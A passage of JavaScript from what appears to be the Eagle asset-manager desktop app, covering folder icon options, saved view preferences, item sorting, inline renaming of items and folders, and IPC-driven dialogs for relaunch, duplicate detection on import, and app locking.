            { type: 'icon', icon: 'keynote' },
            { type: 'icon', icon: 'camera' },
            { type: 'icon', icon: 'aperture' },
            { type: 'icon', icon: 'attachment' },
            { type: 'icon', icon: 'scissors' },
            { type: 'icon', icon: 'palette' },
            { type: 'icon', icon: 'wrench' },
            { type: 'icon', icon: 'helmet' },
            { type: 'icon', icon: 'life-buoy' },
            { type: 'icon', icon: 'graph' },
            { type: 'icon', icon: 'graph2' },
            { type: 'icon', icon: 'tableware' },
            { type: 'icon', icon: 'cog' },
            { type: 'icon', icon: 'bachelor-cap' },
            { type: 'icon', icon: 'cones' },
            { type: 'icon', icon: 'dribbble' },
            { type: 'icon', icon: 'email' },
            { type: 'icon', icon: 'business-card' },
            { type: 'icon', icon: 'coffee' },
            { type: 'icon', icon: 'cart' },
            { type: 'icon', icon: 'lightbulb' },
            { type: 'icon', icon: 'inspiration' },
            
            // { type: 'separator' },

            // 评价、符号、钱、时间
            { type: 'icon', icon: 'thumb-up' },
            { type: 'icon', icon: 'thumb-down' },
            { type: 'icon', icon: 'like' },
            { type: 'icon', icon: 'unlike' },
            { type: 'icon', icon: 'star' },
            { type: 'icon', icon: 'hot' },
            { type: 'icon', icon: 'upload' },
            { type: 'icon', icon: 'download' },
            { type: 'icon', icon: 'paid' },
            { type: 'icon', icon: 'free' },
            { type: 'icon', icon: 'medical' },
            { type: 'icon', icon: 'shield' },
            { type: 'icon', icon: 'search' },
            { type: 'icon', icon: 'shortcuts' },
            { type: 'icon', icon: 'recycle' },
            { type: 'icon', icon: 'excalmation' },
            { type: 'icon', icon: 'question' },
            { type: 'icon', icon: 'coin1' },
            { type: 'icon', icon: 'coin2' },
            { type: 'icon', icon: 'coin3' },
            { type: 'icon', icon: 'coin4' },
            { type: 'icon', icon: 'wallet' },
            { type: 'icon', icon: 'watch' },
            { type: 'icon', icon: 'clock' },
            { type: 'icon', icon: 'calendar-week' },
            { type: 'icon', icon: 'calendar-month' },

            { type: 'separator' },

            // 设备、图表、设计类型、字体
            { type: 'icon', icon: 'website' },
            { type: 'icon', icon: 'phone' },
            { type: 'icon', icon: 'tablet' },
            { type: 'icon', icon: 'desktop' },
            { type: 'icon', icon: 'tv' },
            { type: 'icon', icon: 'cpu' },
            { type: 'icon', icon: 'safari' },
            { type: 'icon', icon: 'chrome' },
            { type: 'icon', icon: 'pie' },
            { type: 'icon', icon: 'bar-chart' },
            { type: 'icon', icon: 'line-chart' },
            { type: 'icon', icon: '2d' },
            { type: 'icon', icon: '3d' },
            { type: 'icon', icon: 'contrast' },
            { type: 'icon', icon: 'texture' },
            { type: 'icon', icon: 'transition' },
            { type: 'icon', icon: 'animation' },
            { type: 'icon', icon: 'spectrogram' },
            { type: 'icon', icon: 'font-sans' },
            { type: 'icon', icon: 'font-sans-serif' },
            { type: 'icon', icon: 'font-handwritten' },

            // { type: 'separator' },

            { type: 'icon', icon: 'flag' },
            { type: 'icon', icon: 'earth' },
            { type: 'icon', icon: 'pin' },
            { type: 'icon', icon: 'pin-check' },
            { type: 'icon', icon: 'map' },
            { type: 'icon', icon: 'road' },
            { type: 'icon', icon: 'motor' },
            { type: 'icon', icon: 'rocket' },
            { type: 'icon', icon: 'airplan' },
            { type: 'icon', icon: 'ship' },
            { type: 'icon', icon: 'train' },
            { type: 'icon', icon: 'car' },
            { type: 'icon', icon: 'truck' },
            { type: 'icon', icon: 'water-drop' },
            { type: 'icon', icon: 'sun' },
            { type: 'icon', icon: 'moon' },
            { type: 'icon', icon: 'tree' },
            { type: 'icon', icon: 'mountain' },
            { type: 'icon', icon: 'cloud' },

            // { type: 'separator' },

            // 建筑、家俱、游戏、成就
            { type: 'icon', icon: 'bathtub' },
            { type: 'icon', icon: 'door' },
            { type: 'icon', icon: 'bed' },
            { type: 'icon', icon: 'cabinet' },
            { type: 'icon', icon: 'sofa' },
            { type: 'icon', icon: 'home' },
            { type: 'icon', icon: 'store' },
            { type: 'icon', icon: 'house' },
            { type: 'icon', icon: 'game' },
            { type: 'icon', icon: 'weapon' },
            { type: 'icon', icon: 'armor' },
            { type: 'icon', icon: 'award2' },
            { type: 'icon', icon: 'award' },
            { type: 'icon', icon: 'award3' },
            { type: 'icon', icon: 'crown' },
            { type: 'icon', icon: 'rophy' },
            { type: 'icon', icon: 'gift' },
            { type: 'icon', icon: 'facebook' },
            { type: 'icon', icon: 'twitter' },
            { type: 'icon', icon: 'instagram' },

            { type: 'separator' },

            // 人、動物、神、魔
            { type: 'icon', icon: 'eye' },
            { type: 'icon', icon: 'bear' },
            { type: 'icon', icon: 'dog' },
            { type: 'icon', icon: 'cat' },
            { type: 'icon', icon: 'man' },
            { type: 'icon', icon: 'woman' },
            { type: 'icon', icon: 'group' },
            { type: 'icon', icon: 'smile' },
            { type: 'icon', icon: 'meh' },
            { type: 'icon', icon: 'frown' },
            { type: 'icon', icon: 'die' },
            { type: 'icon', icon: 'baby' },
            { type: 'icon', icon: 'kid' },
            { type: 'icon', icon: 'angel' },
            { type: 'icon', icon: 'demon' },
            { type: 'icon', icon: 'hand' },
            { type: 'icon', icon: 'brain' },

            { type: 'separator' },

            // 数字
            { type: 'icon', icon: 'number0' },
            { type: 'icon', icon: 'number1' },
            { type: 'icon', icon: 'number2' },
            { type: 'icon', icon: 'number3' },
            { type: 'icon', icon: 'number4' },
            { type: 'icon', icon: 'number5' },
            { type: 'icon', icon: 'number6' },
            { type: 'icon', icon: 'number7' },
            { type: 'icon', icon: 'number8' },
            { type: 'icon', icon: 'number9' },
            { type: 'icon', icon: 'number10' },
            { type: 'icon', icon: 'number11' },
            { type: 'icon', icon: 'number12' },
            { type: 'icon', icon: 'number13' },
            { type: 'icon', icon: 'number14' },
            { type: 'icon', icon: 'number15' },
            { type: 'icon', icon: 'number16' },
            { type: 'icon', icon: 'number17' },
            { type: 'icon', icon: 'number18' },
            { type: 'icon', icon: 'number19' },
            { type: 'icon', icon: 'number20' },
        ];

        if (localStorage.getItem("isHideMainNav") == 'true') {
            $scope.isHideMainNav = true;
        }

        if (localStorage.getItem("isHideSidebar") == 'true') {
            $scope.isHideSidebar = true;
        }

        if (localStorage.getItem("isHideSubFolder") == 'false') {
            $scope.isHideSubFolder = false;
        }

        if (localStorage.getItem("eagle.list.sortIncrease") == 'false') {
            $scope.sortIncrease = false;
        }

        if (localStorage.getItem("isHideNavigator") == 'true') {
            $scope.isHideNavigator = true;
        }

        if (localStorage.getItem("eagle.search.scope.name") === 'false') { $scope.isSearchScopeName = false; }
        if (localStorage.getItem("eagle.search.scope.folderName") === 'false') { $scope.isSearchScopeFolderName = false; }
        if (localStorage.getItem("eagle.search.scope.folderDesc") === 'false') { $scope.isSearchScopeFolderDesc = false; }
        if (localStorage.getItem("eagle.search.scope.ext") === 'false') { $scope.isSearchScopeExt = false; }
        if (localStorage.getItem("eagle.search.scope.tag") === 'false') { $scope.isSearchScopeTag = false; }
        if (localStorage.getItem("eagle.search.scope.url") === 'false') { $scope.isSearchScopeUrl = false; }
        if (localStorage.getItem("eagle.search.scope.annotation") === 'false') { $scope.isSearchScopeAnnotation = false; }
        if (localStorage.getItem("eagle.search.scope.note") === 'false') { $scope.isSearchScopeNote = false; }
        // TODO
        $scope.isSearchScopeOCR = true;
        // if (localStorage.getItem("eagle.search.scope.ocr") === 'false') { $scope.isSearchScopeOCR = false; }


        preferences = electronSettings.getSync('preferences');
        $scope.showSubfolderContent = preferences.showSubfolderContent;

        if (localStorage.getItem("eagle.list.show.name") == 'false') {
            $scope.showName = false;
            $("#box-container").addClass("hide-box-name");
        }
        else {
            $scope.showName = true;
            $("#box-container").removeClass("hide-box-name");
        }

        if (localStorage.getItem("eagle.list.show.meta") == 'false') {
            $scope.showMetas = false;
            $("#box-container").addClass("hide-box-metas");
        }
        else {
            $scope.showMetas = true;
            $("#box-container").removeClass("hide-box-metas");
        }

        if (localStorage.getItem("eagle.list.show.annotation") == 'false') {
            $scope.showAnnotation = false;
            $("#box-container").addClass("hide-box-annotation");
        }

        if (localStorage.getItem("eagle.list.show.extension") == 'false') {
            $scope.showFileExtension = false;
            $("#box-container").addClass("hide-box-extension");
        }

        if (localStorage.getItem("eagle.list.show.extension_LABEL") == 'false') {
            $scope.showFileExtensionLabel = false;
            $("#box-container").addClass("hide-box-extension-label");
        }

        let defaultListLayoutSettings = {
            props: {
                resolution: true,
                fileSize: true,
                dateImported: true,
                tags: false,
                extension: true,
                rating: false
            }
        };
        if (localStorage["eagle.list.layout.settings"]) {
            try {
                $scope.listLayoutSettings = JSON.parse(localStorage["eagle.list.layout.settings"]);
            } catch (err) {
                $scope.listLayoutSettings = defaultListLayoutSettings;
            }
        }
        else {
            $scope.listLayoutSettings = defaultListLayoutSettings;
        }

        $scope.imageSize = {
            height: 150,
            zoomRatio: 100,
            subfolderWidth: 150
        };
        $scope.sliderZoomRatio = 100;
        $scope.lastZoomMode = localStorage["eagle.viewer.lastZoomMode"] || "fit";
        $scope.tagsSuggestion = [];
        $scope.folders = [];
        $scope.smartFolders = [];
        $scope.quickAccess = [];
        $scope.isExpandFolder = true;
        $scope.isExpandSmartFolder = true;
        $scope.isExpandQuickAccess = true;

        if (localStorage.getItem("eagle.sidebar.folder.expand") == 'false') {
            $scope.isExpandFolder = false;
        }
        if (localStorage.getItem("eagle.sidebar.smartFolder.expand") == 'false') {
            $scope.isExpandSmartFolder = false;
        }
        if (localStorage.getItem("eagle.sidebar.quickAccess.expand") == 'false') {
            $scope.isExpandQuickAccess = false;
        }

        $scope.inspector = eagle.inspector;

        var updateTimer;

        initEvent();

        $scope.sortRawData = (orderBy) => {
            console.time("sortRawData");
            switch (orderBy) {
                case 'NAME':
                    // 使用 collator 会比直接呼叫 localeCompare 快上 20x 以上
                    var collator = new Intl.Collator(languageBCP, { numeric: true, sensitivity: 'base' } );
                    $scope.raw = $scope.raw.sort(function (a, b) {
                        return collator.compare(a.name, b.name);
                    });
                    break;
                case 'EXT':
                    var collator = new Intl.Collator(languageBCP, { numeric: true, sensitivity: 'base' } );
                    $scope.raw = $scope.raw.sort(function (a, b) {
                        return collator.compare(a.ext, b.ext);
                    });
                    break;
                case 'RESOLUTION':
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var ra = a.width * a.height;
                        var rb = b.width * b.height;
                        if(ra > rb) return 1;
                        if(ra < rb) return -1;
                        return 0;
                    });
                    break;
                case 'FILESIZE':
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var sizeA = parseInt(a.size);
                        var sizeB = parseInt(b.size);
                        if(sizeA > sizeB) return 1;
                        if(sizeA < sizeB) return -1;
                        return 0;
                    });
                    break;
                case 'RATING':
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var starA = parseInt(a.star) || 0;
                        var starB = parseInt(b.star) || 0;
                        if(starA > starB) return 1;
                        if(starA < starB) return -1;
                        return 0;
                    });
                    break;
                case 'DURATION':
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var durationA = parseInt(a.duration) || 0;
                        var durationB = parseInt(b.duration) || 0;
                        if(durationA > durationB) return 1;
                        if(durationA < durationB) return -1;
                        return 0;
                    });
                    break;
                case 'BTIME':
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var btimeA = a.btime || a.modificationTime;
                        var btimeB = b.btime || b.modificationTime;
                        if(btimeA > btimeB) return -1;
                        if(btimeA < btimeB) return 1;
                    });
                    break;
                case 'MTIME':
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var mtimeA = a.mtime || a.modificationTime;
                        var mtimeB = b.mtime || b.modificationTime;
                        if(mtimeA > mtimeB) return -1;
                        if(mtimeA < mtimeB) return 1;
                    });
                    break;
                default:
                    $scope.raw = $scope.raw.sort(function(a, b) {
                        var mtimeA = a.modificationTime || a.mtime;
                        var mtimeB = b.modificationTime || b.mtime;
                        if(mtimeA > mtimeB) return -1;
                        if(mtimeA < mtimeB) return 1;
                    });
            }
            updateCurrentOrderAndIncrease();
            console.timeEnd("sortRawData");
        };

        $scope.sortData = (data, orderBy) => {
            let clone = data.slice();
            console.time("sortRawData");
            switch (orderBy) {
                case 'NAME':
                    // 使用 collator 会比直接呼叫 localeCompare 快上 20x 以上
                    var collator = new Intl.Collator(languageBCP, { numeric: true, sensitivity: 'base' } );
                    clone.sort(function (a, b) {
                        return collator.compare(a.name, b.name);
                    });
                    break;
                case 'EXT':
                    var collator = new Intl.Collator(languageBCP, { numeric: true, sensitivity: 'base' } );
                    clone.sort(function (a, b) {
                        return collator.compare(a.ext, b.ext);
                    });
                    break;
                case 'RESOLUTION':
                    clone.sort(function(a, b) {
                        var ra = a.width * a.height;
                        var rb = b.width * b.height;
                        if(ra > rb) return 1;
                        if(ra < rb) return -1;
                        return 0;
                    });
                    break;
                case 'FILESIZE':
                    clone.sort(function(a, b) {
                        var sizeA = parseInt(a.size);
                        var sizeB = parseInt(b.size);
                        if(sizeA > sizeB) return 1;
                        if(sizeA < sizeB) return -1;
                        return 0;
                    });
                    break;
                case 'RATING':
                    clone.sort(function(a, b) {
                        var starA = parseInt(a.star) || 0;
                        var starB = parseInt(b.star) || 0;
                        if(starA > starB) return 1;
                        if(starA < starB) return -1;
                        return 0;
                    });
                    break;
                case 'DURATION':
                    clone.sort(function(a, b) {
                        var durationA = parseInt(a.duration) || 0;
                        var durationB = parseInt(b.duration) || 0;
                        if(durationA > durationB) return 1;
                        if(durationA < durationB) return -1;
                        return 0;
                    });
                    break;
                case 'MANUAL':
                    console.time("MANUAL");
                    // Note: 使用 mapping 先记录 order 数据，在 sort 函式就不需要使用 _.get 来获取，这样能提升 20x 性能
                    var orderMappings = {};
                    var folderId = $scope.currentFolder.id;
                    for (var i = 0; i < data.length; i++) {
                        var item = data[i];
                        if (item.order && item.order[folderId]) { orderMappings[item.id] = item.order[folderId] }
                        else { orderMappings[item.id] = item.modificationTime + ''; }
                    }

                    clone.sort(function(a, b) {
                        var aTime = orderMappings[a.id];
                        var bTime = orderMappings[b.id];
                        if(aTime > bTime) return -1;
                        else if(aTime < bTime) return 1;
                        else { return 0; }
                    });

                    // data = data.sort(function(a, b) {
                        // var aTime = _.get(a, `order[${$scope.currentFolder.id}]`, a.modificationTime) + '';
                        // var bTime = _.get(b, `order[${$scope.currentFolder.id}]`, b.modificationTime) + '';
                        // if(aTime > bTime) return -1;
                        // else if(aTime < bTime) return 1;
                        // else { return 0; }
                    // });
                    console.timeEnd("MANUAL");
                    break;
                case 'BTIME':
                    clone.sort(function(a, b) {
                        var btimeA = a.btime || a.modificationTime;
                        var btimeB = b.btime || b.modificationTime;
                        if(btimeA > btimeB) return -1;
                        if(btimeA < btimeB) return 1;
                    });
                    break;
                case 'MTIME':
                    clone.sort(function(a, b) {
                        var mtimeA = a.mtime || a.modificationTime;
                        var mtimeB = b.mtime || b.modificationTime;
                        if(mtimeA > mtimeB) return -1;
                        if(mtimeA < mtimeB) return 1;
                    });
                    break;
                case 'RANDOM':
                    clone.shuffle();
                    break;
                default:
                    clone.sort(function(a, b) {
                        if(a.modificationTime > b.modificationTime) return -1;
                        else if(a.modificationTime < b.modificationTime) return 1;
                        return 0;
                    });
            }
            console.timeEnd("sortRawData");
            return clone;
        };

        $("#search").on("focus", function() {
            $rootScope.currentFocus = "content";
        });

        $scope.getItemByElement = function (element) {
            if (!element) return "";
            // var id = element.id.replace("box-", "");
            var id = element.getAttribute("data-box-id");
            return $scope.itemMappings[id];
        };

        $scope.getItemsByElements = function (elements) {
            var items = []
            elements.forEach(function (element) {
                var item = $scope.getItemByElement(element);
                if (item) {
                    items.push(item);
                }
            });
            return items;
        };

        $scope.getSelectedItems = function () {
            var items = ig.getItems(true);
            items = items.filter(function (item) {
                return $scope.selectedMappings[item.id];
                // if (item && item.el && item.el.id) {
                //     var id = item.el.id.replace("box-", "");
                //     return $scope.selectedMappings[id] !== undefined;
                // }
            });
            return items;
        };

        $scope.getSelectedItemElements = function () {
            var items = $scope.getSelectedItems();
            items = items.map(function (item) {
                // if (!item.el) {
                //     item.el = $(item.content)[0];
                //     console.log(item.el);
                // }
                return item.el;
            });
            return items;
        };

        $("#scroll-to-top").on("click", function (event) {
            $(this).removeClass("show");
            $scope.gotoTop();
        });

        $("#sidebar-scroll-to-top").on("click", function (event) {
            $(this).removeClass("show");
            $("#sidebar-item-container").scrollTop(0);
        });

        $scope.gotoTop = function () {
            if ($scope.allData.length < $scope.options.page) {
                var $boxContainer = $("#box-container");
                $boxContainer.scrollTop(0);
            }
            else {
                clearTimeout($scope.gotoBottomTimeout);
                resetNgGridLayoutData($scope.allData, 0);
                var $boxContainer = $("#box-container");
                $boxContainer.scrollTop(0);
                $scope.showImages();
            }
        };

        $scope.gotoBottomTimeout;
        $scope.gotoBottom = function () {
            if ($scope.allData.length < $scope.options.page) {
                var $boxContainer = $("#box-container");
                var offset = $boxContainer[0].scrollHeight;
                $boxContainer.scrollTop(offset);
            }
            else {
                var endCursor = parseInt($scope.allData.length / $scope.options.page) - 1 || 0;
                resetNgGridLayoutData($scope.allData, endCursor);
                var $boxContainer = $("#box-container");
                var times = [100, 400];
                var offset = $boxContainer[0].scrollHeight;
                for (var i = times[0]; i < times[1]; i+=100) {
                    $scope.gotoBottomTimeout = setTimeout(function () { $boxContainer.scrollTop(1000000); $scope.showImages(); }, i);
                }
            }
        };

        $("#box-container .box-list").on("mousedown", ".box .thumbnail, .box .name, .box .box-drag-helper, .box .box-sortable-helper", function (event) {
            var $box = $(".box").has(this);
            var image = $scope.getItemByElement($box[0]);
            if ($scope.selected.length === 1 && $scope.selected[0] === image && $(this).hasClass("name") && $box.hasClass("selected")) {
                let $name = $(this);
                let renameTimeout;
                $name.one("mouseup.rename", function (event) {
                    clearTimeout(renameTimeout);
                    renameTimeout = setTimeout(function () {
                        enableImageNameEditable(event, $name);
                    }, 300);
                });
                $name.one("mouseleave.rename", function (event) {
                    $name.off("mouseup.rename");
                });
            }
            $scope.select(event, image);
            $scope.$evalAsync();
        });

        $("#box-container .box-list").on("mouseup", ".box .thumbnail, .box .name, .box .box-drag-helper, .box .box-sortable-helper", function (event) {
            var $box = $(".box").has(this);
            var image = $scope.getItemByElement($box[0]);
            $scope.onBoxMouseup(event, image);
            $scope.$evalAsync();
        });

        // $("body").on("mousedown", ".box", function (event) {
        //     if ($scope.layout !== "ListLayout") return;
        //     var $box = $(this);
        //     var image = $scope.getItemByElement($box[0]);
        //     $scope.select(event, image);
        //     $scope.$evalAsync();
        // });

        // $("body").on("mouseup", ".box", function (event) {
        //     if ($scope.layout !== "ListLayout") return;
        //     var $box = $(this);
        //     var image = $scope.getItemByElement($box[0]);
        //     $scope.onBoxMouseup(event, image);
        //     $scope.$evalAsync();
        // });

        $("#box-container .box-list").on('mousedown', '.box .activate-btn', function(event) {
            event.stopPropagation();
            var $scope = angular.element("body").scope();
            var $box = $(".box").has(this);
            var image = $scope.getItemByElement($box[0]);
            var isActivated = $box.hasClass("activated");
            if (isActivated) {
                $scope.deactivateFont(image, {showNotify: true, updateView: true});
            }
            else {
                $scope.activateFont(image, {showNotify: true, updateView: true});
            }
        });

        function enableImageNameEditable (event, $name) {
            if (!$name) return;
            if ($name.hasClass("editable")) return;
            var originalName = $name.text().trim();
            $name.attr("contenteditable", "true");
            $name.addClass("editable");
            $name.focus();
            setTimeout(function () {
                $name.focus();
                $name.select();
                document.execCommand('selectAll',false,null);
            }, 50);

            $name.off("mousedown").on("mousedown", function (event) {
                event.stopPropagation();
            });

            $name.off("keydown").on("keydown", function (event) {
                var keyCode = event.keyCode;
                switch (keyCode) {
                    case 13:
                        event.preventDefault();
                        event.stopPropagation();
                        $name.trigger("blur");
                        break;
                    case 27: 
                        event.preventDefault();
                        event.stopPropagation();
                        $name.html(`<span>${originalName}</span>`);
                        exitEditable();
                        break;
                    case 65: 
                        if (event.metaKey || event.ctrlKey) {
                            event.preventDefault();
                            event.stopPropagation();
                            document.execCommand('selectAll',false,null);
                        }
                        break;
                }
            });

            $name.off("paste").on("paste", function(e) {
                e.preventDefault();
                var text = (e.originalEvent || e).clipboardData.getData('text/plain');
                document.execCommand("insertHTML", false, text);
            });

            $name.off("blur").on("blur", debounce(function () {
                exitEditable();
                var $scope = angular.element("body").scope(); 
                var newName = $name.text();
                if (!newName || !newName.trim()) {
                    $name.html(`<span>${originalName}</span>`);
                    return;
                }
                if (newName !== originalName && $scope && $scope.selected[0]) {

                    var name = newName;
                    var image = $scope.selected[0];
                    
                    name = name.substr(0, remainingFilenameLength($scope.libraryPath));
                    name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                    name = _.unescape(name);
                    eagle.inspector.newName = name;

                    if (emojiRegex.test(name)) {
                        name = name.replace(emojiRegex, '');
                        eagle.inspector.newName = name;
                    }
                    
                    if (name) {
                        image.oldName = originalName;
                        image.name = name;
                        image.newName = name;
                    }
                    $name.html(`<span>${name}</span>`);
                    console.log(`${originalName} > ${name}`);
                    ayncsImagesChange([image]);
                    hiddenByCurrentFilter([image]);
                    // TagManager.getSuggestTags([image]);
                    $scope.$evalAsync();
                    try { electronLog && electronLog.info(`[app] Change list item's name: ${originalName}(${image.id}) > ${newName}`); } catch (err) {};
                }
            }, 200, true));

            function exitEditable () {
                $name.css({
                    "white-space": "normal"
                });
                $name.attr("contenteditable", "false");
                $name.removeClass("editable");
                $name.off("keyup");
                $name.off("keydown");
                $name.off("mousedown");
                setTimeout(function () {
                    $name.css({
                        "white-space": ""
                    });
                }, 33);
            }
        }

        $scope.enableSubFolderNameEditable = function (event, folder) {
            var $name = $(event.target);
            if (!folder) return;
            if ($name.hasClass("editable")) return;
            if (!$name || $name.length === 0) return;

            $scope.selectFolder(event, folder); 

            var originalName = $name.text().trim();
            $name.attr("contenteditable", "true");
            $name.addClass("editable");
            $name.focus();
            setTimeout(function () {
                $name.select();
                document.execCommand('selectAll',false,null);
            }, 50);

            $name.off("mousedown").on("mousedown", function (event) {
                event.stopPropagation();
            });

            $name.off("keydown").on("keydown", function (event) {
                var keyCode = event.keyCode;
                switch (keyCode) {
                    case 13:
                        event.preventDefault();
                        event.stopPropagation();
                        $name.trigger("blur");
                        break;
                    case 27: 
                        event.preventDefault();
                        event.stopPropagation();
                        $name.html(`${originalName}`);
                        exitEditable();
                        break;
                    case 65: 
                        if (event.metaKey || event.ctrlKey) {
                            event.preventDefault();
                            event.stopPropagation();
                            document.execCommand('selectAll',false,null);
                        }
                        break;
                }
            });

            $name.off("paste").on("paste", function(e) {
                e.preventDefault();
                var text = (e.originalEvent || e).clipboardData.getData('text/plain');
                document.execCommand("insertHTML", false, text);
            });

            $name.off("click").on("click", function (event) {
                event.stopPropagation();
            });

            $name.off("blur").on("blur", debounce(function () {
                exitEditable();
                var $scope = angular.element("body").scope(); 
                var newName = $name.text();
                if (!newName || !newName.trim()) {
                    $name.html(`${originalName}`);
                    return;
                }
                if (newName !== originalName && folder) {

                    var name = newName;
                    name = name.substr(0, remainingFilenameLength($scope.libraryPath));
                    name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                    name = _.unescape(name);

                    if (emojiRegex.test(name)) {
                        name = name.replace(emojiRegex, '');
                    }
                    
                    $name.html(`${name}`);
                    folder.name = name;
                    $scope.saveFolder();
                    $scope.$evalAsync();
                    try { electronLog && electronLog.info(`[app] Change sub-folder name: ${originalName}(${folder.id}) > ${newName}`); } catch (err) {};
                }
            }, 500, true));

            function exitEditable () {
                $name.css({
                    "white-space": "normal"
                });
                $name.attr("contenteditable", "false");
                $name.removeClass("editable");
                $name.off("click");
                $name.off("keyup");
                $name.off("keydown");
                $name.off("mousedown");
                setTimeout(function () {
                    $name.css({
                        "white-space": ""
                    });
                }, 33);
            }
        }

        // 双击图片名称修改名字
        $("#box-container .box-list").on("dblclick", ".box .name", function (event) {
            var $element = $(this);
            enableImageNameEditable(event, $element);
        });

        $("#box-container .box-list").on("dblclick", ".box .thumbnail, .box .box-drag-helper, .box img, .box video", function (event) {
            var $box = $(".box").has(this);
            var image = $scope.getItemByElement($box[0]);
            if (event.metaKey || event.ctrlKey) {
            	if (
					(EagleConfig.SUPPORT_FORMATS[image.ext] && !AUDIO_TYPES[image.ext]) ||
					pluginModule.previewExtension.viewerPluginMap[image.ext]
				 ) {
					openInNewWindow([image]);
		            analytics.event('NewWindow', 'Open', image.ext);
		        }
                return;
            }
            else if (event.altKey) {
                $scope.openFilesWithDefault([image]);
                return;
            }
            else {
                if ($rootScope.preferences.habits.doubleclick !== 'external') {
                    $scope.enterDetailMode(event, image);
                }
                else {
                    // 使用预设软体开启
                    $scope.openFileWithDefault(image);
                }
                $scope.$evalAsync();
            }
        });

        $("#box-container .box-list").on("contextmenu", ".box .thumbnail, .box .box-drag-helper, .box img, .box .name, .box video", function (event) {
        // $("#box-container .box-list").on("mousedown", ".box .thumbnail, .box img, .box .name, .box video", function (event) {
            // if( event.button !== 2 ) return;
            event && event.stopPropagation();
            var $box = $(".box").has(this);
            var image = $scope.getItemByElement($box[0]);
            $scope.openItemContextMenu(event, image);
            $scope.$evalAsync();
        });

        function initEvent() {

            ipcRenderer.on('show-swal', function(event, params) {
                if (!params) return;
                swal({
                    title: params.title,
                    html: params.description,
                    showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    cancelButtonColor: "#777777",
                    confirmButtonText: params.button,
                }).then(function () {});
            });

            ipcRenderer.on('open-relaunch-confirm', function(event, params) {
                if (!params) return;
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon info"></div>
                            <h4 class="alert-title">${params.title}</h4>
                            <p class="alert-desc">${params.description}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: params.confirmButtonText,
                    cancelButtonText: params.cancelButtonText,
                }).then(function () {
                	var showAlert = $scope.uploadQueue.length > 0 || $scope.downloadQueueLength > 0 || $scope.metadataQueueLength > 0 || $scope.isCleaningTrash || $scope.isImporting || $(".progress-dialog.open").not(".library-loading-dialog").length > 0 || $("#saving-progress-bar.open").length > 0 ;
	                if (showAlert) {
	                    swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__('Dialog.BeforeQuit.Title')}</h4>
                                    <p class="alert-desc">${i18n.__("Dialog.BeforeQuit.Descript")}</p>
                                </div>
                            `,
	                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
	                        width: 400,
                            customClass: "alert-box",
	                        cancelButtonColor: "#777777",
	                        confirmButtonText: i18n.__("Dialog.BeforeQuit.Quit"),
	                        cancelButtonText: i18n.__("general.cancel"),
	                        icon: "success"
	                    }).then(function () {
	                        ipcRenderer.send("save-cache-file");
			                if (currentWindow && !currentWindow.isDestroyed()) {
			                    currentWindow.hide();
			                }
			                setTimeout(function () {
			                    app.relaunch();
			                    app.exit(0);
			                }, 3000);
	                    });
	                }
	                else {
	                	ipcRenderer.send("save-cache-file");
		                if (currentWindow && !currentWindow.isDestroyed()) {
		                    currentWindow.hide();
		                }
		                setTimeout(function () {
		                    app.relaunch();
		                    app.exit(0);
		                }, 3000);
	                }
                });
            });


            // eaglepack 导入排除重复项目功能
            ipcRenderer.on('get-duplicate-map', function(event, items) {

                function isDuplicateImage (image) {
                    if (!$scope.duplicateMappings) return false;
                    if (image.ext === 'svg') return false;
                    if (image.ext === 'tif') return false;
                    if (image.ext === 'tiff') return false;

                    var hashID = getHashID(image);
                    if (!hashID) return false;
                    return $scope.duplicateMappings[hashID];
                };

                function ignoreDuplicates (duplicates) {
                    return new Promise((resolve, reject) => {

                        if (!duplicates || duplicates.length === 0) {
                            return resolve(false);
                        }

                        let detail = i18n.__('dialog.eaglepackDuplicates.desc').replace("{count}", duplicates.length);
                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__('dialog.eaglepackDuplicates.title')}</h4>
                                    <p class="alert-desc">${detail}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
	                        customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__('dialog.eaglepackDuplicates.cancel'),
                            cancelButtonText: i18n.__('dialog.eaglepackDuplicates.import'),
                        }).then(function () {
                            // 移除重複
                            return resolve(true);
                        }, function () {
                            // 不移除重複
                            return resolve(false);
                        });
                    });
                }

                if (!items || items.length === 0) {
                    ipcRenderer.sendTo(backgroundWindowID, 'get-duplicate-map-done', {});
                    return;
                }
                try {
                    $scope.findDupclipate(undefined);
                    var duplicatesItemsMap = {};
                    items.forEach(function (item) {
                        if (isDuplicateImage(item)) {
                            duplicatesItemsMap[item.id] = true;
                        }
                    });

                    ignoreDuplicates(Object.keys(duplicatesItemsMap)).then(function (isIgnoreDuplicates) {
                        if (isIgnoreDuplicates) {
                            ipcRenderer.send('electron-info', `[bg] ignore ${Object.keys(duplicatesItemsMap).length} duplicate files`);
                            ipcRenderer.sendTo(backgroundWindowID, 'get-duplicate-map-done', duplicatesItemsMap);
                        }
                        else {
                            ipcRenderer.sendTo(backgroundWindowID, 'get-duplicate-map-done', undefined);
                        }
                    });
                }
                catch (err) {
                    ipcRenderer.sendTo(backgroundWindowID, 'get-duplicate-map-done', undefined);
                }
            });

            ipcRenderer.on('lock-now', function() {
                $scope.lockApp();
                $rootScope.$evalAsync();
            });

            ipcRenderer.on('update-menu', function() {
                $rootScope.initMenu();
                $scope.$evalAsync();
            });
            
